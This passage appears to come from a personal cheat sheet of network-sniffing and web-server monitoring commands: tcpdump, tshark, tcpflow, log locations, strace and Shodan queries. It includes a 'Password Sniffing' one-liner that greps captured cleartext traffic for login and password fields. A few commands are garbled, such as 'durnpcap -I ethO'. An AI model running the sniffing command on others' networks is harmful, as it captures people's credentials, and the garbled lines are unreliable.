     host $x.$Domain | grep 'has address' | cut -d ' ' -f1,4 >> tmp
done






##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] TCPDump - Packet Sniffer
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##




##-=====================================-##

####TCP Listen to traffic####
tcpdump tcp dst <IP> <PORT> and tcp dst <IP> <PORT>

##-======================================-##
##   [+] Get Cisco network information
##-======================================-##
tcpdump -nn -v -i eth0 -s 1500 -c 1 'ether[20:2] == 0x2000'





## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 src 10.0.0.10
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 dst 10.0.0.10
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 'udp port 53'
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 'tcp port 443'
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 'dst 10.0.0.10 and dst port 443'
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -w out.pcap -s 65535 'udp port 53'
## ------------------------------------------------------------------------------------------------ ##



## ------------------------------------------------------------------------------------------------ ##
	tcpdump -r $Capture.pcap                             ## Read the file
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -n src host 192.168.2.10 -r $Capture.pcap     ## Filter By Source
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -n dst host 192.168.2.12 -r $Capture.pcap     ## Filter By Destination
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -n port 443 -r $Capture.pcap                  ## Filter By Port
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -nX -r $Capture.pcap                          ## Read the file and dump in hex format
## ------------------------------------------------------------------------------------------------ ##



##-======================================================================-##
##   [+] Android adb Shell - Capture traffic on wlan0 interface 
##                           Save output to File on external sdcard
##-======================================================================-##
adb shell tcpdump -ni wlan0 -U -w /sdcard/$File.pcap port 53 or port 443 or icmp6


##-================================================================-##
##   [+] Android adb Shell - TCPDump Capture All ICMP6 Packets
##-================================================================-##
tcpdump -ni any -s0 -U -w /sdcard/icmp6.pcap icmp6





tcpflow -p -c -i eth0 port 80



# print DNS outgoing queries
tcpdump -vvv -s 0 -l -n port 53  # print DNS outgoing queries



# Useful to detect DNS amplification
tcpdump -nnni bond0 -c 100 -w sample.txt dst port 53


# which bogus DNS resolvers are sending you an amplified attack.
awk '{print $3}' sample.txt | cut -d '.' -f1-4 | sort | uniq -c | sort -nr




##-===============================================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===============================================================================-##
##   	[+] Apache|httpd|Lighttpd|Nginx - Web Server - Log File Locations:
##-===============================================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===============================================================================-##


## ------------------------------------------------------------------------------------------------ ##
	  cat /etc/httpd/logs/access_log			##  [?] 
## ------------------------------------------------------------------------------------------------ ##
	  cat /etc/httpd/logs/access.log			##  [?] 
## ------------------------------------------------------------------------------------------------ ##
	  cat /etc/httpd/logs/error_log			    ##  [?] 
## ------------------------------------------------------------------------------------------------ ##
	  cat /etc/httpd/logs/error.log			    ##  [?] 
## ------------------------------------------------------------------------------------------------ ##


## ------------------------------------------------------------------------------------------------ ##
	  cat /var/log/apache2/access_log			##  [?] 
## ------------------------------------------------------------------------------------------------ ##
	  cat /var/log/apache2/access.log			##  [?] 
## ------------------------------------------------------------------------------------------------ ##
	  cat /var/log/apache2/error_log			##  [?] 
## ------------------------------------------------------------------------------------------------ ##
	  cat /var/log/apache2/error.log			##  [?] 
## ------------------------------------------------------------------------------------------------ ##
	  cat /var/log/apache/access_log			##  [?] 
## ------------------------------------------------------------------------------------------------ ##
	  cat /var/log/apache/access.log			##  [?] 
## ------------------------------------------------------------------------------------------------ ##


## ------------------------------------------------------------------------------------------------ ##
	  cat /var/log/httpd/access_log			    ##  [?] 
## ------------------------------------------------------------------------------------------------ ##
	  cat /var/log/httpd/access.log			    ##  [?] 
## ------------------------------------------------------------------------------------------------ ##
	  cat /var/log/httpd/error_log			    ##  [?] 
## ------------------------------------------------------------------------------------------------ ##
	  cat /var/log/httpd/error.log			    ##  [?] 
## ------------------------------------------------------------------------------------------------ ##


## ------------------------------------------------------------------------------------------------ ##
	  cat /var/log/lighttpd/access.log			        ##  [?] 
## ------------------------------------------------------------------------------------------------ ##
	  cat /var/log/lighttpd/error.log			        ##  [?] 
## ------------------------------------------------------------------------------------------------ ##
	  cat /var/log/lighttpd/lighttpd.access.log			##  [?] 
## ------------------------------------------------------------------------------------------------ ##
	  cat /var/log/lighttpd/lighttpd.error.log			##  [?] 
## ------------------------------------------------------------------------------------------------ ##


## ------------------------------------------------------------------------------------------------ ##
	  cat /var/www/logs/access_log			            ##  [?] 
## ------------------------------------------------------------------------------------------------ ##
	  cat /var/www/logs/access.log			            ##  [?] 
## ------------------------------------------------------------------------------------------------ ##





sudo tcpdump -i any -w /tmp/http.log &




tcpdump -A -r /tmp/http.log | less






##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] TShark - Network Traffic Sniffer + Analyzer
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


##-====================================-##
##   [+] convert a .cap file to .txt:
##-====================================-##
tshark -V -r $File > $File


##-================================================================-##
##   [+] select all ftp traffic through internet gateway snup:
##-================================================================-##
gateway snup and (port ftp or ftp-data)


##-==========================================-##
##   [+] select the start and end packets
##-==========================================-##
## ------------------------------------------------------------ ##
##   [?] The SYN and FIN packets of each
##       TCP conversation that involves a non-local host.
## ------------------------------------------------------------ ##
tcp[tcpflags] & (tcp-syn|tcp-fin) != 0 and not src and dst net localnet



##-=========================================================-##
##   [+] select all IPv4 HTTP packets to and from port 80
##   [+] print only packets that contain data
##-=========================================================-##
## ---------------------------------------------------------------------- ##
##   [?] for example, not SYN and FIN packets and ACK-only packets.
## ---------------------------------------------------------------------- ##
tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)



##-=================================================================-##
##   [+] select IP broadcast or multicast packets
##   [+] that were not sent via Ethernet broadcast or multicast:
##-=================================================================-##
ether[0] & 1 = 0 and ip[16] >= 224



##-===================================================================-##
##   [+] select all ICMP packets that are not echo requests/replies
##-===================================================================-##
## ---------------------------------- ##
##   [?] (i.e., not ping packets)
## ---------------------------------- ##
icmp[icmptype] != icmp-echo and icmp[icmptype] != icmp-echoreply


##-====================================-##
##   [+] catch all multicast traffic
##-====================================-##
'ether[0] & 1 != 0'


##-==========================================================-##
##   [+] match only tcp packets whose source port is $Port
##-==========================================================-##
tcp src port $Port


##-====================================-##
##   [+]
##-====================================-##
tcp port 21, 'udp portrange 7000-7009', 'wlan addr2 0:2:3:4:5:6'


##-============================================-##
##  			[+] HTTP Statistics
##-============================================-##
tshark -r $File -q -z http,stat,


##-===================================================-##
##  		[+] HTTP Statistics with Rates
##-===================================================-##
tshark -r $File -q -z http,tree


##-===================================================-##
##  		[+] TOP 10 HTTP Request URL
##-===================================================-##
tshark -r $File -R http.request -T fields -e http.host | sed -e 's/?.*$//' | sed -e 's#^\(.*\)\t\(.*\)$#http://\1\2#' | sort | uniq -c | sort -rn | head -n 10


##-===================================================-##
##  		[+] TOP 10 talkers by Source IP
##-===================================================-##
tshark -r $File -T fields -e ip.src | sort | uniq -c | sort -rn | head -10


##-===================================================-##
##  		[+] TOP 10 talkers by DST IP
##-===================================================-##
tshark -r $File -T fields -e ip.dst | sort | uniq -c | sort -rn | head -10


##-=====================================================-##
##   [+] TOP 10 talkers by port usage or SYN attempts
##-=====================================================-##
tshark -r $File -T fields -e ip.src "tcp.flags.syn==1 && tcp.flags.ack==0" | sort | uniq -c | sort -rn | head -10


##-===================================================-##
##   [+] HTTP 10 Response Code 200 and Content Type
##-===================================================-##
tshark -r $File -R http.response.code==200 -T fields -e "http.content_type" |sort |uniq -c | sort -rn | head -10


##-===================================================-##
##  	[+] TOP HTTP Host and Request Method
##-===================================================-##
tshark -r $File -R http.host -T fields -e http.host -e http.request.method |sort |uniq -c | sort -rn | head -10


##-===================================================-##
##  		[+] TOP 10 DNS Query DST Host
##-===================================================-##
tshark -r $File -T fields -e dns.qry.name -R "dns.flags.response eq 0" |sort |uniq -c | sort -rn | head -10


##-===================================================-##
##  		[+] TOP 10 DNS Query by Soure IP
##-===================================================-##
tshark -r $File -T fields -e ip.src -R "dns.flags.response eq 0" |sort |uniq -c | sort -rn | head -10


##-===================================================-##
##  		[+] TOP 10 ICMP Conversations
##-===================================================-##
tshark -r $File -V icmp -T fields -e icmp.ident -e ip.src |sort |uniq -c | sort -rn | head -10


##-===================================================-##
##   [+] Capture only first 56 bytes of each frame
##-===================================================-##
## -------------------------------------------------------------- ##
##   [?] enough to cover the IP header and typical TCP header.
## -------------------------------------------------------------- ##
tcpdump -nn -i eth0 -w $File.pcap -s 56


## ------------------------------------------------------------------------------------------------ ##
	tshark -i any -f 'port http' -Y http -l -N nNC		## HTTP Protocol Traffic
## ------------------------------------------------------------------------------------------------ ##
	tshark -i any -f 'port smtp' -Y smtp -l -N nNC		## SMTP Protocol Traffic
## ------------------------------------------------------------------------------------------------ ##
	tshark -i any -f 'port imap' -Y imap -l -N nNC		## IMAP Protocol Traffic
## ------------------------------------------------------------------------------------------------ ##





##-=======================================================-##
##    [+] Filter out traffic with a source MAC of $MAC
##-======================================================-##
tshark -r $File.cap -2 -R "wlan.sa==$MAC && wlan.fc.type_subtype==0x08" -T fields -e frame.time.delta | head -n 2




## ----------------------------------------- ##
##    [+] Monitoring requests
## ----------------------------------------- ##
sudo tcpflow -p -c -i eth0 port 80 | grep -oE '(GET|POST|HEAD) .* HTTP/1.[01]|Host: .*'



##-=================================================-##
##  [+] process all of the pcap files in the current directory
##-=================================================-##
tcpflow -o out -a -l *.pcap



##-===========================================-##
##  [+] Capture all HTTP flows over port 80 
##      and store them as text files
##-===========================================-##
tcpflow -i wlan0 'port 80'

tcpflow -c -e -r $File.pcap 'tcp and port (80 or 443)'
tcpflow -r $File.pcap tcp and port \(80 or 443\)



Examining Records With tcpshow:

tcpdump –r tcpdumpfile –enx ‘dst port 31789’ | tcpshow -nolink


##-=============================================-##
##   [+] View the “topN” talkers to identify
##       the noisiest IPs by flow count.
##-=============================================-##
nfdump -r $File -s ip/flows -n 10







##-===================================================-##
##   [+]
##-===================================================-##
tcpxtract --file $File.pcap --output $File --device eth0



CAPTURE TRAFFIC FOR <SEC> SECONDS

durnpcap -I ethO -a duration: sec -w file file.pcap














##-======================================-##
##   [+] analyze traffic remotely over ssh w/ wireshark
##-======================================-##
ssh root@server.com 'tshark -f "port !22" -w -' | wireshark -k -i -





##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] Apache - WebServer - Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-============================================================-##
##  [+] Track Apache processes and redirect output to a file
##-============================================================-##
ps auxw | grep '[a]pache' | awk '{print " -p " $2}' | xargs strace -o /tmp/strace-apache-proc.out


##-=====================================================-##
##   [+] Monitor open connections for httpd
##   [+] including listen, count and sort it per IP
##-=====================================================-##
watch "netstat -plan|grep :80|awk {'print \$5'} | cut -d: -f 1 | sort | uniq -c | sort -nk 1"




##-================================================-##
##           [+] Web Server Log Fields:
##-================================================-##
## ------------------------------------------------ ##
##   [?] Server IP Address       S-ip
##   [?] Webpage Requested       cs-uri-stem
##   [?] Server Port             s-port
##   [?] Client IP Address       c-ip
##   [?] Program Used            cs user-agent
## ------------------------------------------------ ##




## --------------------------------------------------------------------------- ##
##  [+] Collect all the IP Addresses from a log file and sort by frequency
## --------------------------------------------------------------------------- ##
cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn



##-====================================================================-##
##  [+] Ban all IPs that attempted to access phpmyadmin on your site
##-====================================================================-##
grep "phpmyadmin" access.log | grep -Po "^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}" | sort | uniq | xargs -I% sudo iptables -A INPUT -s % -j DROP



# Analyse compressed Apache access logs for the most commonly requested pages

zcat access_log.*.gz | awk '{print $7}' | sort | uniq -c | sort -n | tail -n 20



# Find pages returning 404 errors in apache logs

awk '$9 == 404 {print $7}' access_log | uniq -c | sort -rn | head




egrep -o 'acct_id=[0-9]+' access.log | cut -d= -f2 | sort | uniq -c | sort -rn



openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/apache2/ssl/apache.key -out /etc/apache2/ssl/apache.crt







##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] Nginx - WebServer - Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-=======================================================-##
##   [+] Generate strong DH parameters for Nginxs SSL
##-=======================================================-##
openssl dhparam -out /etc/nginx/ssl/dhparam.pem 4096


## ---------------------------------------- ##
##   [?] set ssl_dhparam in nginx.conf
## ---------------------------------------- ##







##-=======================================================-##
##   [+] Shodan - Find Apache Servers in San Francisco:
##-=======================================================-##
apache city:"San Francisco"


##-================================================-##
##   [+] Shodan - Find Nginx Servers in Germany:
##-================================================-##
nginx country:"DE"


##-=============================================-##
##   [+] Shodan - Find GWS (Google Web Server) Servers:
##-=============================================-##
"Server: gws" hostname:"google"



##-==========================================-##
##  [+] STrace - Trace all Nginx processes
##-==========================================-##
sudo strace -e trace=network -p `pidof nginx | sed -e 's/ /,/g'`













##-==============================================================-##
##  [+] Retrieve dropped connections from firewalld journaling
##-==============================================================-##
journalctl -b | grep -o "PROTO=.*" | sed -r 's/(PROTO|SPT|DPT|LEN)=//g' | awk '{print $1, $3}' | sort | uniq -c




##-===========================================================-##
##  [+] STrace - Intercept stdout/stderr of another process
##-===========================================================-##
strace -ff -e trace=write -e write=1,2 -p $PID



##-=====================================================-##
##  [+] STrace - Monitor writes to stdout and stderr
##-=====================================================-##
alias stracemonitorio="$(strace -f -e trace=write -e write=1,2 $1 >/dev/null)"




sniffit
ettercap





##-=====================================-##
##   [+] TCPDump - Password Sniffing
##-=====================================-##
tcpdump -i eth0 port http or port ftp or port smtp or port imap or port pop3 -l -A | egrep –i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=||name=|name:|pass:|user:|username:|password:|login:|pass |user ' --color=auto --line-






##  Siege


openssl to generate a certificate and key


openssl req -nodes -new -days 365 -newkey rsa:1024 -keyout key.pem -out cert.pem


combine both your cert and your key in a single file:
#   $ cat key.pem > client.pem
#   $ cat cert.pem >> client.pem






https://docs.google.com/spreadsheets/u/1/d/1H9_xaxQHpWaa4O_Son4Gx0YOIzlcBWMsdvePFX68EKU/pubhtml" target="_blank">APT Groups and Operations</a>

A spreadsheet containing information and intelligence about APT groups, operations and tactics.


https://www.autoshun.org/
A public service offering at most 2000 malicious IPs and some more resources.












